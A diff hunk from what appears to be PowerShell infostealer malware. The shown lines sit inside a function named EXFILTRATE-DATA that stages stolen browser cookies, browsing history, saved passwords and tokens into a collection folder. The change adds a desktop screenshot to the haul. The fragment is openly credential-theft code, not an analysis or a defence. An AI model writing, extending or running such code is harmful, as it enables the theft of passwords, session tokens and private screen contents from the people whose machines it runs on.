@@ -372,6 +372,7 @@ function EXFILTRATE-DATA {
     Move-Item "$main_temp\browser-cookies.txt" $folder_general -Force
     Move-Item "$main_temp\browser-history.txt" $folder_general -Force
     Move-Item "$main_temp\browser-passwords.txt" $folder_general -Force
+    Move-Item "$main_temp\desktop-screenshot.png" $folder_general -Force
     Move-Item "$main_temp\tokens.txt" $folder_general -Force
 
     #remove empty dirs
